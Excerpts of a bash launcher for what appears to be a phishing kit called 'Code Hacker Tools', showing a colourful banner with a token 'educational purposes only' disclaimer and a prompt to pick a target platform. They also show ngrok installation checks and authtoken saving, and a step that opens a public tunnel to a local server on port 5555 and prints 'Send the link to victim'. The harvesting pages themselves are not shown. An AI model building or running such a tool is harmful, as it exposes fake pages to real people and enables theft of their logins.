...
printf "\n"
printf "\e[1;90m  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m\n"
printf "\e[1;92m       ⚡  \e[0m\e[1;97mCode Hacker Tools\e[0m\e[1;92m  ⚡   \e[0m\e[1;93mv2.5  \e[0m\e[1;91m[ Elite Edition ]\e[0m\n"
printf "\e[1;90m  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m\n"
printf "\n"
printf "\e[1;90m  ┌─────────────────────────────────────────────────────────┐\e[0m\n"
printf "\e[1;90m  │\e[0m\e[1;91m  ⚠  Disclaimer: For educational purposes only.          \e[0m\e[1;90m│\e[0m\n"
printf "\e[1;90m  │\e[0m\e[1;91m     Unauthorized use is illegal.                        \e[0m\e[1;90m│\e[0m\n"
printf "\e[1;90m  └─────────────────────────────────────────────────────────┘\e[0m\n"
printf "\n"
printf " \e[1;96m ◈─────────────────────────────────────────────────────◈\e[0m\n"
printf " \e[1;93m   ⚡  Select a target platform to begin  ⚡\e[0m\n"
printf " \e[1;96m ◈─────────────────────────────────────────────────────◈\e[0m\n"
printf "\n"
}
...
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Ngrok not found! Install it from https://ngrok.com/download \e[0m\n"
exit 1
fi
# Check if ngrok authtoken is already configured
ngrok_config_file="$HOME/.config/ngrok/ngrok.yml"
ngrok_config_file2="$HOME/Library/Application Support/ngrok/ngrok.yml"
authtoken_set=false
if [[ -f "$ngrok_config_file" ]] && grep -q "authtoken" "$ngrok_config_file" 2>/dev/null; then
authtoken_set=true
elif [[ -f "$ngrok_config_file2" ]] && grep -q "authtoken" "$ngrok_config_file2" 2>/dev/null; then
authtoken_set=true
fi
if [[ $authtoken_set == false ]]; then
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Ngrok Authtoken not found!\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Get your free token at:\e[0m\e[1;96m https://dashboard.ngrok.com/authtokens\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Paste your Authtoken here: \e[0m\e[1;96m' ngrok_token
if [[ -z "$ngrok_token" ]]; then
printf " \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m No token entered. Aborting.\e[0m\n"
exit 1
fi
$ngrok_cmd config add-authtoken "$ngrok_token" > /dev/null 2>&1
printf " \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;92m Authtoken saved successfully!\e[0m\n"
fi
printf "\e[0m\n"
...
sleep 2
$ngrok_cmd http 5555 > /dev/null 2>&1 &
sleep 10
link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o '"public_url":"[^"]*"' | head -n1 | grep -o 'https://[^"]*')
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim:\e[0m\e[1;93m %s \n" $link
found
}
start_local(){
